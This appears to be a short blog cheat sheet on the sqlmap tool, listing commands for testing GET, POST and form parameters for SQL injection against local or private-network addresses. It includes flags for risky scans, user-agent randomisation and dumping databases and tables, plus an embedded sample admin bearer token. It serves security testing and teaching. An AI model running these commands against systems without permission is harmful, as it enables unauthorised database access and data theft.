---
title: "[SQL] sqlmap baisc usage"
published: 2024-04-12
description: 'Basic sqlmap usage for checking sql injection bugs'
tags: [Security, Attack]
category: Attack
draft: false
---

# [SQL] sqlmap
https://github.com/sqlmapproject/sqlmap

## Aim target
### Basic usage
```bash
sqlmap -u "http://localhost:8080/user.php?id=7"
```

## GET attack
### Basic usage
```bash
sqlmap -u "http://localhost:8080/user.php?id=7"
```

### With Query
```bash
sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
```

### With Parameter and with delay
```bash
sqlmap -u "http://172.23.112.1:3001/patient/lookup/a" -p "a" --tables --delay=5
```

### Perform in-depth and risky attacks
```bash
sqlmap -u "http://172.23.112.1:3001/manage" --level=3 --risk=3
```

### Enumerate DBMS database tables with `tables`
```bash
sqlmap -u "http://172.23.112.1:8080/api/v1/users/getInjections?username=Tom" -p "username" --level=3 --tables
```

### With Headers
```bash
sqlmap -u "http://172.23.112.1:3001/client/prescription-list" --level=3 --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN1cGVyYWRtaW4iLCJzdWIiOjEsInJvbGUiOiJhZG1pbiIsImRvY3Rvcl9jb2RlIjpudWxsLCJpYXQiOjE2NjI2NDg5MTEsImV4cCI6MTY5NDE4NDkxMX0.5zjJ0fJSX_s76b5BScUBDMpDOO0GpMrnA_0L1TCu8lM"
``` 

### With cookies
```bash
sqlmap -u "http://localhost:8080/admin.php" --cookie "customerId=591edabaab5b52292042df8a"
```

## POST attack
### Basic usage
```bash
sqlmap -u "http://localhost:8080/admin.php" --data="id=1&name=admin"
sqlmap -u "http://localhost:8080/login/password" --data="username=tom&password=123"
```

### With random-agent
```bash
sqlmap -u "http://172.23.112.1:8080/login/password" --data="username=tom&password=123" --level=3 --random-agent --ignore-code 401
```

```bash
sqlmap -u "http://172.23.112.1:8080/signup" --data="username=tom&password=123&re_password=123" --level=3 --random-agent --ignore-code 401
```

## Form attack
```bash
sqlmap -u "http://localhost:8080/admin.php" --forms
```


## Basic Tag
```
Shows list: --dbs
Shows all tables: -D 'db_name' --tables
Set Url: -u 


After success to injections
Get DB Name: --dbs OR --current-db
Get Tables: --tables
Get col: --columns 
Get datas from tables: --dump 
```